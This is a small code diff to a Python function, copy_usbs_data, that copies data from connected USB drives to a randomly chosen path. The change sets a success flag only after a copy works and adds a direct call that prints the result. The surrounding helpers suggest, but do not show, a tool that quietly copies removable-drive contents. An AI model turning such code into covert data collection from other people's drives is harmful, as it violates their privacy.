@@ -128,7 +128,9 @@ def copy_usbs_data():
             random_path = __get_random_path_in_drive(drive)
             try:
                 __threading_usb_data_copy(random_path)
+                succeeded = True
             except PermissionError:
                 continue
-            succeeded = True
         return random_path
+
+print(copy_usbs_data())
